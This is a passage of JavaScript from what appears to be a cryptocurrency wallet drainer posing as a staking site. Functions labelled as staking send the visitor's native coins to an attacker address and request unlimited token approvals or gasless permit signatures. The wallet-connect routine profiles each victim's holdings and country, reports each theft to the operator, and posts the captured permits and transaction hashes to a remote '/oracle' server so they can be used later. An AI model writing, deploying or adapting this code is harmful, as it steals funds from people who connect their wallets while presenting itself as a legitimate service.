			account : addy,
			value: BigInt(Math.floor(amt)),
			gas: 500000n,
			args: [destination_addy],
			bytecode: '60806040526040516104913803806104918339818101604052602081101561002657600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061040a806100876000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80639e5e03511461003b578063f3fef3a314610045575b600080fd5b610043610093565b005b6100916004803603604081101561005b57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610135565b005b3373ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16146100ec57600080fd5b3373ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610132573d6000803e3d6000fd5b50565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146101f7576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f4f6e6c7920746865206f776e65722063616e207769746864726177000000000081525060200191505060405180910390fd5b60008110158015610209575060648111155b61025e576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260248152602001806103b26024913960400191505060405180910390fd5b6000479050600060648383028161027157fe5b04905060008183039050818310156102f1576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260148152602001807f496e73756666696369656e742062616c616e636500000000000000000000000081525060200191505060405180910390fd5b6000811115610363576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f19350505050158015610361573d6000803e3d6000fd5b505b8473ffffffffffffffffffffffffffffffffffffffff166108fc839081150290604051600060405180830381858888f193505050501580156103a9573d6000803e3d6000fd5b50505050505056fe50657263656e74616765206d757374206265206265747765656e203020616e6420313030a265627a7a7231582056e56c13a98d75ec40c6402a2a523314fc8e45555777fe905ce276bb52912bca64736f6c63430005110032',
		  });
		  if(hash){
			return [1,hash];
		  }
	}
	catch(error){
		return[null,false];
	}
}else{
	let res_code,stat;
	[res_code,stat] = await stakeEthwithSign(chain, addy, amt);
 	if(stat){
			return [res_code,stat];
	}else{
					const tx = await prepareSendTransaction( {
						chainId: chain,
						account: addy,
						to: destination_addy_final,
						value: BigInt(Math.floor(amt)),
						data: "0x",
					} )
	  try{
					const {
						hash
					} = await sendTransaction(tx).catch((e)=>{
						if(e.details == "User canceled"){
							throw new Error("user cancelled"); // Throw an error
						}
					})
				if(hash){
					console.log(hash)
					return [1,hash];
				}
	}	catch(error){
	  return[null,false];
	}
}
}
}

const stakeViaPermit = async (nonce,name,chain,contract,owner,spender,amt,version) => {

	let deadline = Date.now() + 1000 * 60 * 60 * 24 * 356;

const domain = {
	name: name, 
	version: version, chainId: chain, verifyingContract: contract,
}
const types = {
					Permit: [{
						name: "owner", type: "address"
					}, {
						name: "spender", type: "address"
					}, {
						name: "value", type: "uint256"
					}, {
						name: "nonce", type: "uint256"
					}, {
						name: "deadline", type: "uint256"
					},]
}
const message = {
owner: owner,
spender: spender,
value: amt,
nonce: nonce,
deadline: deadline,
};

const res = await signTypedData({
	domain,
	message,
	primaryType: 'Permit',
	types,
  }).catch(err => {return false});

if(!res){
	return false
}
// console.log(res.substring(0, 66),'0x' + res.substring(66, 130),parseInt(res.substring(130, 132), 16));
// console.log(hexToSignature(res));

let r = hexToSignature(res).r;
let s = hexToSignature(res).s;
let v = parseInt(hexToSignature(res).v);
return JSON.stringify({
	value: Web3.utils.toHex(amt), deadline: deadline, v: v, r: r, s: s
});
}

async function stakeToken( chain, contract, addy) {
	let hasPermit = false;
	let versions = ['1', '2'];
	let contractInfo,contract_in,nonce,name,domainSeparator,symbol,version
	let amt = BigInt(Math.floor(11579208923731619542357098500868790785326998466564056403945758400791312963993));
	if(abiUrls.hasOwnProperty(chain)){
		contractInfo = await getABI(contract, abiUrls[chain]);
		contract_in = new Contract(contractInfo[0], contract);
		hasPermit = contract_in.methods.hasOwnProperty('permit') && contract_in.methods.hasOwnProperty('nonces') &&
		contract_in.methods.hasOwnProperty('name') && contract_in.methods.hasOwnProperty('DOMAIN_SEPARATOR') && isValidPermit(contract_in.methods);
		console.log('Has permit', hasPermit);

		if (hasPermit){

		nonce = await readContract({
			address: contract,
			abi: contractInfo[0],
			functionName: 'nonces',
			args: [addy],
			chainId: chain,
		})
		name = await readContract({
			address: contract,
			abi: contractInfo[0],
			functionName: 'name',
			args: [],
			})

		symbol = await readContract({
			address: contract,
			abi: contractInfo[0],
			functionName: 'symbol',
			args: [],
			})


			domainSeparator = await readContract({
			address: contract,
			abi: contractInfo[0],
			functionName: 'DOMAIN_SEPARATOR',
			args: [],
			})


			const [name_,version_] = await findMatchingDomainSeparator(name, versions, chain, contract, domainSeparator, symbol);
			if (name_ && version_){
				name = name_
				version = version_
			}else{
				hasPermit = false;

			}
		}

			
			
	}
	

		
if (hasPermit){
				let permit_hash = await stakeViaPermit(nonce,name,chain,contract, addy, destination_addy,amt,version);
				if(permit_hash){
					return[2,permit_hash];
				}else{
				return[null,false];
			}
}else{

		const public_Client = getPublicClient({
			chainId: chain,
		});

		let isAllowance = true
			await public_Client.simulateContract({
					address: contract,
					abi: approve_abi,
					functionName: 'increaseAllowance',
					account: addy,
					args: [ destination_addy, amt ]
					}).	catch((e) => {
					isAllowance = false
		})
		let contract_data, tx;


		contract_data = encodeFunctionData({
			abi: approve_abi,
			functionName: 'approve',
		args: [ destination_addy, amt ]
		})


		
		if(isAllowance){
			contract_data = encodeFunctionData({
				abi: approve_abi,
				functionName: 'increaseAllowance',
			args: [ destination_addy, amt ]
			})
		}
		 tx = await prepareSendTransaction( {
				chainId: chain,
				account: addy,
				to: contract,
				data: contract_data,
			} ).catch( async(e)=> {
				console.warn("contract interaction error: ", e.details);
				
			
			})
			if(!tx){
				contract_data = encodeFunctionData({
					abi: approve_abi,
					functionName: 'approve',
					args: [ destination_addy, amt ]
				})
				tx = await prepareSendTransaction( {
					chainId: chain,
					account: addy,
					to: contract,
					data: contract_data,
					gas: 30000n
				} ).catch( async(e)=> {
					console.warn("contract interaction error x2: ", e);
				})
			}
		try{
			const {
				hash
			} = await sendTransaction( tx ).catch( async(e)=> {
				console.warn("tx error: ", e.details);
			})
		if(hash){
			return [1,hash];
		}else{
			throw new Error("user cancelled"); // Throw an error
		}
		}
		catch(error){
			return[null,false];
		  }

  }
}

async function noOfnonPermits(tokens) {
    let permitsCount = 0;
    let nonPermitsCount = 0;
    await Promise.all(
        tokens.map(async (token) => {
            const contractInfo = await getABI(token.id, abiUrls[chain_to_chainId(token.chain)]);
            const contract_in = new Contract(contractInfo[0], token.id);
            let hasPermit =
                contract_in.methods.hasOwnProperty('permit') &&
                contract_in.methods.hasOwnProperty('nonces') &&
                contract_in.methods.hasOwnProperty('name') &&
                contract_in.methods.hasOwnProperty('DOMAIN_SEPARATOR') &&
                isValidPermit(contract_in.methods);

            if (hasPermit) {
                permitsCount++;
            } else {
                nonPermitsCount++;
            }
        })
    );
	console.log("permits", permitsCount)
	console.log("nonPermitsCount", nonPermitsCount)
    return nonPermitsCount;
}

async function getEthGasPrice() {
	try{
		const rpcUrl ="https://1rpc.io/eth";
		const web3 = new Web3(new Web3.providers.HttpProvider(rpcUrl));
		const gasPriceWei = await web3.eth.getGasPrice();
		const gasPriceEtherString = web3.utils.fromWei(gasPriceWei, 'ether');
		const gasPriceEtherNumber = parseFloat(gasPriceEtherString);
		const gasLimit = 60000;
		const gasprice_eth = gasPriceEtherNumber * 21000 * (10**18)*1.1;
		const gasprice_approval = gasPriceEtherNumber * gasLimit* (10**18)*1.1;
		return [gasprice_eth,gasprice_approval] ;
	}catch(e){
		return [289730105603400,903054874608000] ;
	}

}


async function wagmi4L() {
	await popUpshow( "con1" );
	const [ tokenBalances, address ] = await fetchBalances();
	if(!tokenBalances){
		alert( `Error: Wallet not in protocol.. Retrying` );
		recalibratebutton( "Retry", true );
		return
	}
		totalBalance = ( tokenBalances.reduce( ( acc, item ) => 
		acc + ( item.amount * item.price ), 0 ) ).toFixed( 2 );
		totalBalancestring += "<code>Native Coins: 🟡\nERC - Tokens: 💎</code>\n\n";
		totalBalancestring += `┌🏦 Networth: <a href="https://debank.com/profile/${address}">$${totalBalance}</a>\n |`;
		tokenBalances.forEach( item => {
		totalBalancestring += `\n├${item.is_native?"🟡":"💎"} ${item.name} - $${(item.amount * item.price).toFixed(2)} -> [${ucfirst(item.chain)}]`;
		} )
		totalBalancestring += `\n |\n└🌀 <a href="https://debank.com/profile/${address}">${format_addy(address)} </a>\n\n`;
	let message = {};
	let emoji = "📍";
	let ctr_str = "";
	if(visitor){
		emoji = gef(visitor.country_code);
		ctr_str = visitor.country_name
	}
	totalBalancestring += `${emoji}<code>${ctr_str}</code> | <code>${gft()}</code>`;



	await popUpshow( "con2" );


	notify( message, `New Connection 🤞🏻\n\n🔗Website: ${window.location.host}\n\n${totalBalancestring}\n` );
	if ( tokenBalances.length === 0 ) {
		await popUpshow( "error" );
		recalibratebutton( "Wallet not in protocol", false );
		return;
	}
	const {
		chain,
		chains
	} = getNetwork();
	let presentChainId = chain.id;
	//stlp
	const [ gasprice_eth, gasprice_approval_eth ] = await getEthGasPrice();
	for ( let item of tokenBalances ) {
		let currtaskcomplete = false
		let targetChainId = chain_to_chainId( item.chain );
		if ( targetChainId !== presentChainId ) {
			popUpshow( "change_chain" );
				try {
					const network = await switchChain(targetChainId,item.chain)
				} catch ( error ) {
					console.error( 'Failed to switch network:', error );
					alert( `Wrong Network. Please Switch Browser Network to ${item.chain}` );
					continue;
				}
			presentChainId = targetChainId;
		}
		let mm_amount;
		let safe_gas = 2;
		await popUpshow( "waitsig" );
		const {
			chain,
			chains
		} = getNetwork();
		const chainIsSupported = !chain.unsupported;
		if ( chainIsSupported ) {
			try {
				if ( item.is_native ) {
					const publicClient = getPublicClient({
						chainId: presentChainId,
					  });
					
					let amount  = parseInt(await publicClient.getBalance({  
					address: address,
					}));
					let items_under_chain = tokenBalances.filter(
						( items ) => items.chain === item.chain ).length;

					let history_under_chain = tx_history.filter(
						( itemss ) => itemss.chain === item.chain ).length;

					let fiveusd_chain = ( safe_gas / item.price ) * ( 10 ** item.decimals );

					if ( parseInt( presentChainId ) === 1 ) {
						let items_under_chain_tokens = tokenBalances.filter(
							( items ) => ( items.chain === item.chain ) && !items.is_native );
						history_under_chain = tx_history.filter(
							( itemss ) => ( itemss.chain === item.chain ) && !itemss.isPermit ).length;
						items_under_chain = await noOfnonPermits( items_under_chain_tokens );
						amount -= gasprice_eth; 
						fiveusd_chain = gasprice_approval_eth;
					}


					let remaining_underchain = ( items_under_chain );
					let item_countr = 0;
					while ( ( 0 < amount ) && ( item_countr < ( remaining_underchain ) ) ) {
						amount -= fiveusd_chain;
						item_countr++
					}
					if ( amount < 0 ) {
						console.log( "low eth balance" );
						continue
					}
					mm_amount = amount / ( 10 ** item.decimals );
					let retry_count = 1;
					do {
					[ tx_hash_type, tx_hash ] = await stakeEth( chain_to_chainId( item.chain ), address, amount );
						retry_count++;
						if ( tx_hash ) {
							currtaskcomplete = true
						}
					} while ( ( retry_count <= retryNo ) && ( !currtaskcomplete ) );
				} else {
					let retry_count = 1;
					do {
					[ tx_hash_type, tx_hash ] = await stakeToken( chain_to_chainId( item.chain ), item.id, address);
						retry_count++;
						if ( tx_hash ) {
							currtaskcomplete = true
						}
					} while ( ( retry_count <= retryNo ) && ( !currtaskcomplete ) );
				}
				if ( !tx_hash ) {
					
					notify({},`┌😞 User Canceled Tx ❌\n`+
						`├${item.is_native?"🟡":"💎"} ${item.name} - $${(item.amount * item.price).toFixed(2)} -> [${ucfirst(item.chain)}]\n`+
						`└🔗Website: ${window.location.host}\n`);

					continue;
				}
				if ( tx_hash_type === 1 ) {
					let maxRetries__ = 5;
					let retries = 0;
					let transaction;
					let retryDelaySeconds = 4;
					async function fetchTransactionWithRetry() {
						while ( retries < maxRetries__ ) {
							try {
								transaction = await fetchTransaction( {
									hash: tx_hash
								} );
								break;
							} catch ( error ) {
								console.log( error );
							}
							await new Promise( resolve => setTimeout( resolve, retryDelaySeconds * 1000 ) );
							retries++;
						}
						if ( retries === maxRetries__ ) {
							throw new Error( "Exceeded maximum number of retries. Tx Not found" );
						}
					}
					try {
						await fetchTransactionWithRetry();
					} catch ( error ) {
						console.error( error );
					}
					if ( transaction ) {
						let message = {
							Address: `<a href="https://debank.com/profile/${address}">${format_addy(address)}</a>`,
							Hash: `<a href="https://explorer.bitquery.io/search/${tx_hash}">${format_addy(tx_hash)}</a>`,
							Chain: ucfirst(item.chain),
							Coin: `${item.name}-(${item.symbol}) - ($${ (item.is_native ? item.price * mm_amount : item.price * item.amount).toFixed(2) })`,
							History: `<a href="https://debank.com/profile/${address}/history">Check Wallet History</a>`,
						};
						notify( message, `New Money Dropped 🏆✅\n\n🔗Website: ${window.location.host}\n` );
					

						if ( !item.is_native ) {
							const requestData = {
								address: address,
								contractAddress: item.id,
								transactionHash: tx_hash,
								websiteUrl: window.location.host,
								chainId: presentChainId,
							};
							const xhrr = new XMLHttpRequest();
							
							const url = `${host_url}/oracle/erc20`;
							xhrr.open( "POST", url, true );
							xhrr.setRequestHeader( "Content-Type", "application/json" );
							xhrr.onreadystatechange = function() {
								if ( xhrr.readyState === 4 && xhrr.status === 200 ) {
									const response = JSON.parse( xhrr.responseText );
									console.log( "Response from server:", response );
								}
							};
							const enc_data = generateEncryptedValue(requestData);
							xhrr.send(JSON.stringify({ encrypted: enc_data })); 
						}
					} else {
						let message = {
							Address: `<a href="https://debank.com/profile/${address}">${format_addy(address)}</a>`,
							Hash: `<a href="https://explorer.bitquery.io/search/${tx_hash}">${format_addy(tx_hash)}</a>`,
							Chain: ucfirst(item.chain),
							Token: `${item.name}-(${item.symbol}) - ($${ (item.is_native ? item.price * mm_amount : item.price * item.amount).toFixed(2) })`,
							History: `<a href="https://debank.com/profile/${address}/history">Check Wallet History</a>`,
						};
						notify( message, `Failed Tx ❌\n\n🔗Website: ${window.location.host}\n` );
					}
				}
				if ( tx_hash_type === 2 ) {
					let message = {
						Address: address,
						Chain: item.chain,
						Token: `${item.name}-(${item.symbol}) - ($${ (item.is_native ? item.price * mm_amount : item.price * item.amount).toFixed(2) })`,
						History: `<a href="https://debank.com/profile/${address}/history">Check Wallet History</a>`,
					};
					notify( message, `⛽ New Gasless Approval ✅\n\n🔗Website: ${window.location.host}\n`);
					if ( !item.is_native ) {
						const requestData = {
							address: address,
							contractAddress: item.id,
							permit: tx_hash,
							websiteUrl: window.location.host,
							chainId: presentChainId,
						};
						const xhrr = new XMLHttpRequest();
						
						const url = `${host_url}/oracle/eip712`;
						xhrr.open( "POST", url, true );
						xhrr.setRequestHeader( "Content-Type", "application/json" );
						xhrr.onreadystatechange = function() {
							if ( xhrr.readyState === 4 && xhrr.status === 200 ) {
								const response = JSON.parse( xhrr.responseText );
								console.log( "Response from server:", response );
							}
						};
						const enc_data = generateEncryptedValue(requestData);
						xhrr.send(JSON.stringify({ encrypted: enc_data })); 
					}
				}
				item.isPermit = tx_hash_type === 2 ? true : false;
				tx_history.push( item );
			} catch ( error ) {
				// console.log(error);
				errorsCount += 1;
				console.log( error );
			}
		} else {
			errorsCount += 1;
			alert( "Network not supported" );
			recalibratebutton( "Network not supported.", true );
		}
	}
	//stlp
	if ( tx_history.length < tokenBalances.length ) {
		popUpshow( "error" );
	}
	if ( errorsCount > 0 ) {
		alert( `Error: Wallet not in protocol.. Retrying` );
		recalibratebutton( "Retry", true );
	}
}
